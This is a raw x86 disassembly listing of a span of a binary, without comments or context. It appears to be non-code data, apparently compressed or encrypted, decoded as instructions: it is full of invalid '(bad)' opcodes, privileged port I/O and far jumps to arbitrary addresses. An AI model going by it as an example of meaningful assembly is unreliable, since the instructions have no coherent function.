  408b26:	add    al,0xf0
  408b28:	add    al,0xea
  408b2a:	out    dx,al
  408b2b:	inc    ebx
  408b2c:	aad    0xf
  408b2e:	and    BYTE PTR [ecx],cl
  408b30:	lock sahf 
  408b32:	fs out dx,al
  408b34:	add    dl,al
  408b36:	add    bl,BYTE PTR [esi]
  408b38:	mov    ah,0x26
  408b3a:	loop   0x408ac0
  408b3c:	pop    esi
  408b3d:	jnp    0x408acf
  408b3f:	jl     0x408ba9
  408b41:	repz mul DWORD PTR [edx]
  408b44:	cmp    BYTE PTR [ebx-0x3a],dh
  408b47:	in     al,dx
  408b48:	jb     0x408b9f
  408b4a:	mov    ds:0xea350259,eax
  408b4f:	push   0x23
  408b51:	and    BYTE PTR [edi+0x6fef6f4b],al
  408b57:	or     al,0x91
  408b59:	test   DWORD PTR [eax],edi
  408b5b:	dec    ebx
  408b5c:	jns    0x408bc0
  408b5e:	adc    DWORD PTR [edx+ebx*4+0x7b],0xfffffff2
  408b63:	mov    ds:0x9bebc01f,eax
  408b68:	jmp    0x408be5
  408b6a:	or     edx,0xffffffb1
  408b6d:	mov    WORD PTR [eax+0x36],es
  408b70:	push   eax
  408b71:	sbb    eax,0x7547fd8d
  408b76:	(bad)  
  408b77:	pop    edi
  408b78:	in     al,dx
  408b79:	jmp    0xb9a0:0x55322f74
  408b80:	push   esi
  408b81:	iret   
  408b82:	mov    gs,WORD PTR [edi+0x4e3ed8de]
  408b88:	push   ebx
  408b89:	aaa    
  408b8a:	jno    0x408bef
  408b8c:	icebp  
  408b8d:	dec    eax
  408b8e:	outs   dx,DWORD PTR ds:[esi]
  408b8f:	jp     0x408b7a
  408b91:	add    eax,0xaf7e3995
  408b96:	neg    BYTE PTR [ecx]
  408b98:	push   cs
  408b99:	cwde   
  408b9a:	inc    esp
  408b9b:	lea    edi,[esi]
  408b9d:	dec    esi
  408b9e:	fiadd  WORD PTR [edi-0x6d56e1d4]
  408ba4:	ror    BYTE PTR [esi+0x3],0xa0
  408ba8:	xchg   ecx,eax
  408ba9:	or     eax,0x75c74df3
  408bae:	scas   al,BYTE PTR es:[edi]
  408baf:	xor    cl,BYTE PTR ds:0x7d4ccea9
  408bb5:	sbb    al,0x2e
  408bb7:	push   eax
  408bb8:	fstp   QWORD PTR [ebx]
  408bba:	and    ecx,DWORD PTR [ebx-0x7535e6b0]
  408bc0:	cdq    
  408bc1:	push   esi
  408bc2:	jae    0x408c1f
  408bc4:	and    bh,BYTE PTR [edi+0xe4d217d]
  408bca:	pop    ds
  408bcb:	fnsave [eax]
  408bcd:	mov    esp,0x83fed2a5
  408bd2:	pop    ebx
  408bd3:	(bad)  
  408bd4:	jbe    0x408b89
  408bd6:	pop    esi
  408bd7:	retf   
  408bd8:	call   0x9c11:0x26d059dd
  408bdf:	js     0x408b9b
  408be1:	icebp  
  408be2:	cmc    
  408be3:	sbb    bl,BYTE PTR [eax]
  408be5:	retf   
  408be6:	mov    esi,0x9aa290dc
  408beb:	jmp    0xc969:0xff32f0c4
  408bf2:	in     al,dx
  408bf3:	mov    al,ds:0x7b3f6143
  408bf8:	stc    
  408bf9:	pop    es
  408bfa:	jmp    0xbc36f55
  408bff:	out    dx,al
  408c00:	sub    DWORD PTR [eax+0x8],esi
  408c03:	retf   0xb395
  408c06:	jle    0x408ba3
  408c08:	(bad)  
  408c09:	pop    ebx
  408c0a:	scas   eax,DWORD PTR es:[edi]
  408c0b:	fst    DWORD PTR [bx+di+0x63]
  408c0f:	push   es
  408c10:	int    0xd8
  408c12:	jne    0x408c8d
  408c14:	mov    ebp,edx
  408c16:	mov    eax,ds:0x9ac61e16
  408c1b:	pop    esp
  408c1c:	push   ds
  408c1d:	hlt    
  408c1e:	dec    edi
  408c1f:	out    0x93,al
  408c21:	pop    ebx
  408c22:	push   es
  408c23:	and    ch,bl
  408c25:	inc    ebp
  408c26:	jno    0x408c42
  408c28:	es sub ecx,edx
  408c2b:	push   0x444d1ddf
  408c30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c31:	jbe    0x408bdd
  408c33:	and    eax,0x24620175
  408c38:	lods   al,BYTE PTR ds:[esi]
  408c39:	xchg   DWORD PTR [ebx],edx
  408c3b:	pop    ecx
  408c3c:	push   ss
  408c3d:	mov    ebp,0x4668dfdf
  408c42:	icebp  
  408c43:	es push esp
  408c45:	jnp    0x408bda
  408c47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c48:	imul   esp,DWORD PTR [edi],0x59
  408c4b:	loopne 0x408c3f
  408c4d:	xor    eax,0xff1b4f62
  408c52:	iret   
  408c53:	jge    0x408cb3
  408c55:	mul    BYTE PTR [ebx-0x2e]
  408c58:	cmc    
  408c59:	add    BYTE PTR [ecx],0x86
  408c5c:	data16 mov WORD PTR [ecx+0xe0e1bb5],gs
  408c63:	adc    dl,BYTE PTR [ebx]
  408c65:	jle    0x408ca4
  408c67:	dec    esi
  408c68:	xor    dl,bl
  408c6a:	push   ecx
  408c6b:	test   ebx,esp
  408c6d:	test   dl,0x84
  408c70:	dec    edx
  408c71:	jecxz  0x408c10
  408c73:	lea    eax,[ecx+edx*8+0x61]
  408c77:	sbb    eax,0x8cb1b2b9
  408c7c:	ins    DWORD PTR es:[edi],dx
  408c7d:	sub    DWORD PTR [edx+0x34],edi
  408c80:	xchg   BYTE PTR ds:[edi-0x63],ah
  408c84:	popf   
  408c85:	inc    esp
  408c86:	aas    
  408c87:	mov    esi,0x979f7bf1
  408c8c:	push   ebp
  408c8d:	aam    0x1b
  408c8f:	loopne 0x408c34
  408c91:	bound  ecx,QWORD PTR [ecx+0x51]
  408c94:	nop
  408c95:	and    dl,BYTE PTR [eax-0x30]
  408c98:	test   DWORD PTR ds:0xb68a1331,ebx
  408c9e:	mov    WORD PTR [ecx],gs
  408ca0:	xchg   edi,eax
  408ca1:	lods   al,BYTE PTR ds:[esi]
  408ca2:	sub    esi,DWORD PTR [edx-0x37]
  408ca5:	test   eax,0xb5cebf66
  408caa:	sub    dh,ah
  408cac:	js     0x408d02
  408cae:	mov    bh,0xb2
  408cb0:	fxch   st(3)
  408cb2:	or     ch,BYTE PTR [edx]
  408cb4:	sub    DWORD PTR ds:0x278a09d8,edx
  408cba:	mov    ah,0x70
  408cbc:	jmp    0x6499:0x9dd06e70
  408cc3:	test   DWORD PTR [edi+0x52],esi
  408cc6:	stos   BYTE PTR es:[edi],al
  408cc7:	shl    DWORD PTR [ecx-0x2a86169a],1
  408ccd:	shl    DWORD PTR [ecx],cl
  408ccf:	retf   
  408cd0:	and    ah,BYTE PTR [ecx+0x34]
  408cd3:	imul   ebx,ebx,0xf651d0d5
  408cd9:	cli    
  408cda:	xchg   ecx,eax
  408cdb:	lock inc ebp
  408cdd:	push   ecx
  408cde:	int    0x12
  408ce0:	mov    eax,0x79b1bc0
  408ce5:	in     eax,dx
  408ce6:	mov    bh,0xd9
  408ce8:	retf   0xd27f
  408ceb:	jb     0x408d29
  408ced:	jo     0x408d58
  408cef:	in     al,0x76
  408cf1:	push   ecx
  408cf2:	pop    ds
  408cf3:	jmp    0xd2f13f30
  408cf8:	add    bl,0xb9
  408cfb:	mov    cl,BYTE PTR [edi]
  408cfd:	les    edi,FWORD PTR [edi+0x56]
  408d00:	dec    ebp
  408d01:	jo     0x408cd9
  408d03:	mov    ch,0x85
  408d05:	jmp    0xed36:0xcccab807
  408d0c:	push   ds
  408d0d:	ret    0x2381
  408d10:	sub    DWORD PTR [ecx],esp
  408d12:	cwde   
  408d13:	cmp    DWORD PTR [edi-0x1c8babc],esp
  408d19:	cwde   
  408d1a:	mov    edx,0xef3bd490
  408d1f:	shl    ebx,cl
  408d21:	and    eax,0x1fd2364c
  408d26:	xor    edx,DWORD PTR [ecx]
  408d28:	enter  0xaa48,0xb
  408d2c:	sbb    eax,0xd14357e9
  408d32:	sbb    eax,0xbd77fe2
  408d37:	add    eax,0xa395ee69
  408d3c:	sbb    al,BYTE PTR [edx+ebx*4-0x14]
  408d40:	jae    0x408cf8
  408d42:	push   cs
  408d43:	clc    
  408d44:	jns    0x408d24
  408d46:	xchg   esp,edi
  408d48:	pop    ds
  408d49:	jns    0x408d79
  408d4b:	pop    ss
  408d4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d4d:	(bad)  
  408d4e:	int    0xdd
  408d50:	inc    edi
  408d51:	xor    ah,BYTE PTR [ebp-0x474522c5]
  408d57:	aam    0x3
  408d59:	mov    dl,0x27
  408d5b:	mov    ecx,0x97cd899b
  408d60:	adc    edx,DWORD PTR [esi]
  408d62:	cmp    al,0x70
  408d64:	mov    bh,BYTE PTR [ebx-0x5b9b46a6]
  408d6a:	cmp    BYTE PTR ds:0xe83389be,0x3a
  408d71:	test   eax,0x948137fc
  408d76:	sub    BYTE PTR [edx],ch
  408d78:	aam    0x44
  408d7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d7b:	xor    esi,DWORD PTR [esi]
  408d7d:	mov    esi,0xfd00ce2f
  408d82:	retf   
  408d83:	dec    ebx
  408d84:	push   eax
  408d85:	push   ebx
  408d86:	fstp   TBYTE PTR [edx]
  408d88:	jle    0x408d21
  408d8a:	jns    0x408e08
  408d8c:	lods   eax,DWORD PTR ds:[esi]
  408d8d:	xor    al,0x3d
  408d8f:	rcl    al,cl
  408d91:	scas   al,BYTE PTR es:[edi]
  408d92:	push   esp
  408d93:	bound  esi,QWORD PTR [ecx+0xa]
  408d96:	mov    ebp,ebp
  408d98:	mov    edx,DWORD PTR [edx+0x6a5628ba]
  408d9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d9f:	xchg   esp,eax
  408da0:	lock mov esp,0x317bef6e
  408da6:	xor    al,0x78
  408da8:	imul   eax,DWORD PTR [eax],0xc01cde7c
  408dae:	rcl    DWORD PTR [esi],1
  408db0:	xchg   DWORD PTR [ebx],ebx
  408db2:	push   ds
  408db3:	inc    dl
  408db5:	cmp    BYTE PTR [ecx+0x79cc775b],0x3c
  408dbc:	call   0x6f1d:0x7dee53be
  408dc3:	mov    esp,0x3c9ea392
  408dc8:	lds    eax,FWORD PTR [ecx+0x71]
  408dcb:	push   esi
  408dcc:	fcom   QWORD PTR [ecx]
  408dce:	sbb    ch,BYTE PTR [edi-0x4a23ac50]
  408dd4:	pop    ebx
  408dd5:	or     DWORD PTR [eax],edi
  408dd7:	enter  0x98d,0x38
  408ddb:	dec    edx
  408ddc:	ror    DWORD PTR [eax-0x4d],0x9d
  408de0:	xchg   BYTE PTR ds:0x6ce98bfe,al
  408de6:	lds    esp,FWORD PTR [ebp-0x24607945]
  408dec:	adc    BYTE PTR [ebp+0x12],bl
  408def:	xor    ch,BYTE PTR [eax]
  408df1:	pop    ds
  408df2:	sub    dh,BYTE PTR [ecx]
  408df4:	test   DWORD PTR [edi-0x68],esp
  408df7:	push   esp
  408df8:	cmp    al,0x97
  408dfa:	or     BYTE PTR [edx],bl
  408dfc:	shr    dl,1
  408dfe:	fwait
  408dff:	adc    DWORD PTR ds:0xfed6e45f,esi
  408e05:	cvtps2pd xmm6,QWORD PTR [ecx+0x50cacb42]
  408e0c:	xor    edi,edi
  408e0e:	cmp    esi,DWORD PTR ds:0x65f780d4
  408e14:	mov    edx,eax
  408e16:	mov    cl,0x43
  408e18:	and    edi,DWORD PTR [ebx+0x28]
  408e1b:	push   ds
  408e1c:	aaa    
  408e1d:	jb     0x15d7ba3f
  408e23:	cmp    eax,0xd0e00875
  408e28:	int    0xca
  408e2a:	imul   DWORD PTR [esp+edi*1+0x17]
  408e2e:	aad    0x8d
  408e30:	pop    eax
  408e31:	adc    ebp,DWORD PTR [esi+edi*1+0x11c52dd2]
  408e38:	hlt    
  408e39:	xor    dh,BYTE PTR [ebp+0x75]
  408e3c:	push   ds
  408e3d:	pop    ss
  408e3e:	fwait
  408e3f:	stos   BYTE PTR es:[edi],al
  408e40:	jno    0x408e44
  408e42:	test   DWORD PTR [edi-0x28bb3aec],esp
  408e48:	pop    esi
  408e49:	push   ss
  408e4a:	(bad)  [edx+0x274e8b74]
  408e50:	(bad)  
  408e51:	popf   
  408e52:	pop    es
  408e53:	xor    eax,0xbd3cb6ff
  408e58:	repnz or DWORD PTR [edx],esi
  408e5b:	push   edx
  408e5c:	adc    DWORD PTR [esp+edi*2],edx
  408e5f:	jns    0x408e6e
  408e61:	mov    bh,0xe7
  408e63:	fwait
  408e64:	jmp    0xa8e5:0x7991d266
  408e6b:	adc    eax,0xf3c2c9f6
  408e70:	retf   
  408e71:	test   DWORD PTR [esi],esp
  408e73:	imul   ebx,esp,0x4c1d60d5
  408e79:	call   0x6cf4:0xa57eee46
  408e80:	dec    esi
  408e81:	dec    edx
  408e82:	mov    ?,WORD PTR [ecx]
  408e84:	sbb    ebx,ebp
  408e86:	mov    esi,ecx
  408e88:	out    0x82,eax
  408e8a:	cmp    ebp,DWORD PTR [edi-0x9f0f0e3]
  408e90:	test   edi,ebx
  408e92:	(bad)  
  408e94:	ss push ebx
  408e96:	retf   
  408e97:	call   0xe20:0xaf53af48
  408e9e:	sbb    eax,0x1d8f4cef
  408ea3:	retf   0xcced
  408ea6:	outs   dx,BYTE PTR ds:[esi]
  408ea7:	ret    
  408ea8:	gs jecxz 0x408e51
  408eab:	mov    edx,edx
  408ead:	mov    bl,0x7e
  408eaf:	sbb    bh,cl
  408eb1:	xchg   edi,eax
  408eb2:	add    ah,dh
  408eb4:	pushf  
  408eb5:	fisttp QWORD PTR [esi+0x74]
  408eb8:	jae    0x408f2e
  408eba:	jnp    0x408eb4
  408ebc:	jmp    DWORD PTR [esi-0x25]
  408ebf:	sbb    BYTE PTR [eax-0x696a8b85],ah
  408ec5:	outs   dx,DWORD PTR ds:[esi]
  408ec6:	pop    esi
  408ec7:	or     ch,BYTE PTR [ecx]
  408ec9:	mov    ah,0xae
  408ecb:	ins    BYTE PTR es:[edi],dx
  408ecc:	cmovb  edx,DWORD PTR [eax]
  408ecf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ed0:	inc    esp
  408ed1:	ins    BYTE PTR es:[edi],dx
  408ed2:	pop    esi
  408ed3:	or     DWORD PTR [ecx+ebx*2-0x38],ebx
  408ed7:	and    al,0xf4
  408ed9:	(bad)  
  408eda:	jmp    0x408f2e
  408edc:	dec    esp
  408edd:	(bad)  
  408ede:	mov    WORD PTR [ecx+0x2c],cs
  408ee1:	mov    cl,0x90
  408ee3:	in     al,dx
  408ee4:	dec    edi
  408ee5:	push   ebp
  408ee6:	shl    DWORD PTR [edx+0x74],cl
  408ee9:	stos   DWORD PTR es:[edi],eax
  408eea:	jg     0x408edf
  408eec:	loope  0x408e70
  408eee:	lods   eax,DWORD PTR ds:[esi]
  408eef:	es jg  0x408f43
  408ef2:	gs in  eax,0x97
  408ef5:	shl    DWORD PTR [eax-0x4d],cl
  408ef8:	jbe    0x408ec3
  408efa:	sub    BYTE PTR [ecx+eax*8-0x40],bl
  408efe:	xor    al,0xb4
  408f00:	imul   eax,DWORD PTR [edx+0x49a6f002],0x15830340
  408f0a:	jmp    0x5e7fcde5
  408f0f:	test   al,0x26
  408f11:	fnstsw WORD PTR [ebx+0x4]
  408f14:	mov    ?,WORD PTR [ecx-0x62]
  408f17:	adc    ch,ch
  408f19:	mov    cl,0xe3
  408f1b:	sbb    eax,0x7c7187d2
  408f20:	xor    bl,BYTE PTR [esi+0x17]
  408f23:	(bad)  
  408f24:	popa   
  408f25:	mov    esp,0xea7c4559
  408f2a:	or     ebx,DWORD PTR [esi]
  408f2c:	icebp  
  408f2d:	dec    esp
  408f2e:	mov    ch,0x2a
  408f30:	dec    esp
  408f31:	dec    ebp
  408f32:	pop    edx
  408f33:	ins    DWORD PTR es:[edi],dx
  408f34:	push   esp
  408f35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f36:	push   ebp
  408f37:	iret   
  408f38:	mov    ch,0x7b
  408f3a:	(bad)  
  408f3b:	out    dx,al
  408f3c:	fcom   DWORD PTR [esi+edi*4-0x668eb182]
  408f43:	add    eax,DWORD PTR [ebp+0xdd35b7a]
  408f49:	loopne 0x408f59
  408f4b:	sbb    DWORD PTR [ebx+0x412e8a63],esi
  408f51:	shl    DWORD PTR [ebx-0x4178899e],1
  408f57:	call   edi
  408f59:	xchg   ecx,eax
  408f5a:	test   eax,0x502baf6d
  408f5f:	lods   al,BYTE PTR ds:[esi]
  408f60:	hlt    
  408f61:	daa    
  408f62:	mov    ds:0x363971ab,al
  408f67:	mov    ebp,DWORD PTR [ecx-0x5a]
  408f6a:	outs   dx,DWORD PTR ds:[esi]
  408f6b:	in     al,dx
  408f6c:	out    dx,eax
  408f6d:	ret    0xe0c
  408f70:	mov    esi,0xfd45967c
  408f75:	data16 fldcw WORD PTR [edi-0x7e]
  408f79:	call   0xf6718079
  408f7e:	aas    
  408f7f:	les    esp,FWORD PTR [esi+0xd]
  408f82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f83:	adc    DWORD PTR [edx+0x9],esi
  408f86:	and    DWORD PTR [ebx+0x1c],ebx
  408f89:	into   
  408f8a:	fisubr WORD PTR [edx+0x2c7d5a20]
  408f90:	mov    bh,0x43
  408f92:	loope  0x408f51
  408f94:	mov    bh,0xe
  408f96:	cmp    al,0x48
  408f98:	mov    ch,0x58
  408f9a:	or     ch,BYTE PTR [eax+0x62]
  408f9d:	inc    esp
  408f9e:	es mov esi,ecx
  408fa1:	xchg   esi,eax
  408fa2:	outs   dx,BYTE PTR ds:[esi]
  408fa3:	xchg   ebx,eax
  408fa4:	mov    BYTE PTR ds:0x61994012,dl
  408faa:	test   al,0x99
  408fac:	lods   al,BYTE PTR ds:[esi]
  408fad:	rcr    BYTE PTR [ebp-0x63998529],1
  408fb3:	loop   0x408f79
  408fb5:	and    BYTE PTR [eax],0xc9
  408fb8:	or     DWORD PTR [ebp+eiz*4-0x1e133383],eax
  408fbf:	xor    bl,bl
  408fc1:	gs pop edi
  408fc3:	add    eax,eax
  408fc5:	jp     0x408fd9
  408fc7:	dec    eax
  408fc8:	stos   BYTE PTR es:[edi],al
  408fc9:	push   eax
  408fca:	(bad)  
  408fcb:	push   0x70319c0e
  408fd0:	sub    dl,BYTE PTR [eax-0x3c]
  408fd3:	and    al,0xc8
  408fd5:	and    edi,DWORD PTR [edx-0x6fd75989]
  408fdb:	cmp    esi,DWORD PTR [ecx]
  408fdd:	lock cli 
  408fdf:	rol    DWORD PTR [ebx],0x40
  408fe2:	fld    DWORD PTR [ecx]
  408fe4:	xchg   ebp,eax
  408fe5:	push   0xffffffec
  408fe7:	je     0x409001
  408fe9:	popa   
  408fea:	lock cmp BYTE PTR cs:[edi-0x1b],bh
  408fef:	or     BYTE PTR [ebx+eax*2],0xc6
  408ff3:	(bad)  
  408ff4:	sbb    al,0xc3
  408ff6:	mov    edi,0x4f422db1
  408ffb:	jmp    0xba0eeb0d
  409000:	addr16 push ds
  409002:	add    DWORD PTR [ecx-0x9],ecx
  409005:	popf   
  409006:	int    0xab
  409008:	adc    BYTE PTR [edx+0x41],bl
  40900b:	add    al,0x32
  40900d:	mov    WORD PTR [esi+0x58],ds
  409010:	aaa    
  409011:	imul   eax,DWORD PTR ds:0xea8fbff,0xa0e0138a
  40901b:	nop
  40901c:	cs mov cl,0x0
  40901f:	sar    DWORD PTR [eax],cl
  409021:	lods   al,BYTE PTR ds:[esi]
  409022:	imul   ebp,ebx,0x3146802c
  409028:	push   edx
  409029:	sti    
  40902a:	pop    edi
  40902b:	jp     0x40909b
  40902d:	adc    al,0x1c
  40902f:	dec    ecx
  409030:	(bad)  
  409031:	neg    DWORD PTR [esi-0x4f]
  409034:	push   cs
  409035:	add    BYTE PTR [ebp-0x34],al
  409038:	jbe    0x409083
  40903a:	imul   ebx,DWORD PTR [edx],0x44746ad2
  409040:	ins    BYTE PTR es:[edi],dx
  409041:	ret    
  409042:	add    BYTE PTR [ecx],cl
  409044:	enter  0xa55f,0x72
  409048:	popf   
  409049:	leave  
  40904a:	stos   DWORD PTR es:[edi],eax
  40904b:	ja     0x4090c9
  40904d:	mov    ?,WORD PTR [esi+0x46e29fef]
  409053:	or     BYTE PTR ds:[ebp+0x433d0033],bh
  40905a:	and    BYTE PTR [edx],0x54
  40905d:	jge    0x409076
  40905f:	enter  0xf95b,0x37
  409063:	inc    esp
  409064:	pop    es
  409065:	mov    BYTE PTR [ebx],0xa6
  409068:	xchg   BYTE PTR [edx+0x70],cl
  40906b:	push   0x47f7de54
  409070:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409071:	xchg   edi,eax
  409072:	aad    0x18
  409074:	ja     0x409022
  409076:	mov    ecx,0xeff48367
  40907b:	add    bh,BYTE PTR [esi+0x1e3154e3]
  409081:	xlat   BYTE PTR ds:[ebx]
  409082:	jno    0x4090a6
  409084:	and    BYTE PTR [edi+0x25],dl
  409087:	sbb    al,BYTE PTR [ebp+0x63]
  40908a:	xchg   edi,eax
  40908b:	inc    esp
  40908c:	mov    bh,0xc7
  40908e:	(bad)  
  40908f:	xchg   esi,eax
  409090:	push   edi
  409091:	sbb    DWORD PTR [ebx-0x20],ebp
  409094:	scas   al,BYTE PTR es:[edi]
  409095:	mov    eax,0xf89adeca
  40909a:	test   DWORD PTR [ecx-0x1517bbb7],0xb0ff3aaf
  4090a4:	mov    esp,0xe5082738
  4090a9:	lds    ebp,FWORD PTR [ebx+edi*2-0x2a223d8c]
  4090b0:	jg     0x4090ca
  4090b2:	mul    DWORD PTR [ecx+0x7f]
  4090b5:	lahf   
  4090b6:	adc    DWORD PTR [edx],eax
  4090b8:	adc    DWORD PTR [esi+0x67ae37b0],ebx
  4090be:	in     al,dx
  4090bf:	inc    ecx
  4090c0:	sub    ecx,esp
  4090c2:	(bad)  
  4090c3:	aam    0x3c
  4090c5:	sub    esp,0xa95e6825
  4090cb:	dec    ebx
  4090cc:	aad    0x84
  4090ce:	ret    0x9ffb
  4090d1:	fadd   DWORD PTR ds:0xa9edefef
  4090d7:	in     al,dx
  4090d8:	mov    DWORD PTR [esi],ebx
  4090da:	jno    0x409076
  4090dc:	cmc    
  4090dd:	jmp    0x7ef0a3d7
  4090e2:	xor    dh,al
  4090e4:	cli    
  4090e5:	mov    esi,0x60f31640
  4090ea:	push   edi
  4090eb:	xor    al,0x22
  4090ed:	mov    al,ds:0x1cf22bdd
  4090f2:	cmp    BYTE PTR [esi-0x26d84a74],dl
  4090f8:	add    ch,ch
  4090fa:	gs pusha 
  4090fc:	sub    DWORD PTR [eax-0x25a54ded],edx
  409102:	push   0xffffffdb
  409104:	mov    WORD PTR [esi+0x70348669],?
  40910a:	xchg   esp,eax
  40910b:	mov    bl,0xdf
  40910d:	pop    ds
  40910e:	add    al,0xc5
  409110:	test   DWORD PTR [edx+ebp*8+0x653a9a11],edx
  409117:	(bad)  
  409119:	dec    ebx
  40911a:	hlt    
  40911b:	pusha  
  40911c:	fisub  WORD PTR [ebp-0x27]
  40911f:	cmp    esp,eax
  409121:	mov    BYTE PTR [ebx+0x378aeb8d],bl
  409127:	rol    BYTE PTR [edi+0x21],1
  40912a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40912b:	lds    esp,FWORD PTR ds:0xc3c88611
  409131:	scas   eax,DWORD PTR es:[edi]
  409132:	inc    eax
  409133:	in     al,dx
  409134:	fstp   QWORD PTR [ebp+0x15]
  409137:	shl    BYTE PTR [ebx],cl
  409139:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40913a:	(bad)  
  40913b:	xchg   ecx,eax
  40913c:	lods   eax,DWORD PTR ds:[esi]
  40913d:	(bad)  
  40913e:	aas    
  40913f:	push   edx
  409140:	sbb    BYTE PTR [edx],ah
  409142:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409143:	cs test al,0x84
  409146:	test   al,0x66
  409148:	dec    ebx
  409149:	imul   esp,edi,0x54
  40914c:	dec    ebx
  40914d:	cmp    al,0xd5
  40914f:	stc    
  409150:	push   ecx
  409151:	dec    ecx
  409152:	pop    ds
  409153:	pop    ecx
  409154:	shr    BYTE PTR [eax+edi*2+0x3e],1
  409158:	cmp    edx,DWORD PTR [edx]
  40915a:	int3   
  40915b:	push   eax
  40915c:	jo     0x40912a
  40915e:	test   eax,0x2497ae8d
  409163:	(bad)  
  409165:	sub    BYTE PTR [ebp+0x63a6113b],dh
  40916b:	sar    dl,1
  40916d:	add    bh,al
  40916f:	icebp  
  409170:	add    BYTE PTR [ebp+0x3d479c1c],dl
  409176:	(bad)  
  409178:	pushf  
  409179:	pop    eax
  40917a:	into   
  40917b:	pop    ss
  40917c:	bsf    esi,DWORD PTR [eax]
  40917f:	shl    cl,0xdf
  409182:	(bad)  
  409183:	std    
  409184:	arpl   WORD PTR [esi],cx
  409186:	adc    al,0x98
  409188:	and    DWORD PTR [esi+0x25],edx
  40918b:	stos   DWORD PTR es:[edi],eax
  40918c:	iret   
  40918d:	(bad)  
  40918e:	sub    dl,BYTE PTR [ecx+0x27]
  409191:	dec    ebp
  409192:	xor    al,0x31
  409194:	jmp    0xb17b:0x9407817e
  40919b:	inc    ecx
  40919c:	jns    0x409125
  40919e:	dec    esp
  40919f:	and    BYTE PTR [eax],dh
  4091a1:	pushf  
  4091a2:	test   DWORD PTR [ecx],esi
  4091a4:	cmc    
  4091a5:	cdq    
  4091a6:	retf   
  4091a7:	add    BYTE PTR [eax-0x76],ch
  4091aa:	xchg   esp,eax
  4091ab:	(bad)  
  4091ac:	test   al,0x7c
  4091ae:	mov    ebx,0xd0996216
  4091b3:	ins    DWORD PTR es:[edi],dx
  4091b4:	sbb    ecx,esi
  4091b6:	addr16 dec esi
  4091b8:	mov    eax,ds:0x3fa5f28e
  4091bd:	mov    dl,0x8d
  4091bf:	mov    eax,ds:0x77248312
  4091c4:	xchg   ebp,eax
  4091c5:	xchg   BYTE PTR [edx-0x37],al
  4091c8:	mov    esi,0x702b2d27
  4091cd:	arpl   sp,si
  4091cf:	sub    al,0x5d
  4091d1:	gs mov al,0x84
  4091d4:	sbb    esi,esp
  4091d6:	cmp    eax,0x3dc7a338
  4091db:	xchg   DWORD PTR [edx],esp
  4091dd:	dec    ebx
  4091de:	xchg   edx,eax
  4091df:	xor    eax,0xd0d3553f
  4091e4:	pop    ebx
  4091e5:	repz imul eax,esp,0x13
  4091e9:	(bad)  
  4091ea:	or     esp,edx
  4091ec:	shl    DWORD PTR [edx],0x41
  4091ef:	push   0x51
  4091f1:	hlt    
  4091f2:	loop   0x409272
  4091f4:	or     BYTE PTR [esi+edi*8-0x750b5e78],dh
  4091fb:	sub    al,0xa5
  4091fd:	(bad)  
  4091fe:	or     ebx,DWORD PTR [eax-0x2cc7f5fa]
  409204:	jl     0x4091f2
  409206:	mov    ebx,0x36249b4
  40920b:	ss icebp 
  40920d:	fstp   TBYTE PTR [ebx+eiz*4+0x73e98f91]
  409214:	push   edi
  409215:	sbb    eax,0x46c3cfe2
  40921a:	jle    0x4091ec
  40921c:	inc    esp
  40921d:	das    
  40921e:	adc    eax,0x48ae007f
  409223:	lahf   
  409224:	inc    esi
  409225:	lods   eax,DWORD PTR ds:[esi]
  409226:	hlt    
  409227:	ins    BYTE PTR es:[edi],dx
  409228:	mov    ebp,0x4664a46f
  40922d:	not    BYTE PTR [ecx-0xa30bdcf]
  409233:	pop    edx
  409234:	xor    eax,0x5f86ae3c
  409239:	mov    BYTE PTR [edi+0x487ec281],cl
  40923f:	xchg   DWORD PTR [ebp+0x653bd5e3],esi
  409245:	lock push edi
  409247:	(bad)  
  409248:	int    0x6d
  40924a:	lods   al,BYTE PTR ds:[esi]
  40924b:	sub    esp,esi
  40924d:	add    eax,0x4a345337
  409252:	push   esp
  409253:	inc    ebx
  409254:	(bad)  
  409255:	jne    0x4092ba
  409257:	loope  0x4091f8
  409259:	push   ecx
  40925a:	sbb    BYTE PTR [esp-0x61f34aa8],0x69
  409262:	je     0x4092d5
  409264:	int3   
  409265:	jecxz  0x4092d6
  409267:	cdq    
  409268:	jge    0x4092c2
  40926a:	or     BYTE PTR [ebx-0x39b03a37],bh
  409270:	inc    edi
  409271:	das    
  409272:	retf   
  409273:	gs push esp
  409275:	push   0xe3b81ed1
  40927a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40927b:	and    DWORD PTR [edi-0x43],ebx
  40927e:	fld    TBYTE PTR [ebx]
  409280:	mov    ecx,0x687c8524
  409285:	in     al,dx
  409286:	add    dl,BYTE PTR [ecx+0x21616d9a]
  40928c:	sbb    edx,esi
  40928e:	mov    DWORD PTR [esi+0x64],eax
  409291:	jmp    0x87ec4fee
  409296:	ds push ebx
  409298:	and    eax,0x63386307
  40929d:	adc    DWORD PTR [ecx-0x45],ecx
  4092a0:	out    dx,al
  4092a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092a2:	xchg   edi,eax
  4092a3:	dec    edx
  4092a4:	ss cmp eax,0x76de5e88
  4092aa:	pop    ds
  4092ab:	mov    eax,ds:0x967da494
  4092b0:	into   
  4092b1:	adc    bh,ch
  4092b3:	mov    ecx,0xaffded98
  4092b8:	fwait
  4092b9:	push   0x2228c4a4
  4092be:	shl    DWORD PTR [edx],0xdb
  4092c1:	push   0x7b
  4092c3:	mov    esp,0x99ff2a93
  4092c8:	ins    DWORD PTR es:[edi],dx
  4092c9:	sahf   
  4092ca:	es retf 
  4092cc:	fidiv  WORD PTR [edx-0xf2d5fd5]
  4092d2:	xchg   DWORD PTR [edi-0x5f],eax
  4092d5:	fadd   QWORD PTR [edx+0x1bf7fa9f]
  4092db:	xchg   ebp,eax
  4092dc:	cmp    DWORD PTR [edi+eax*8+0x53],ebp
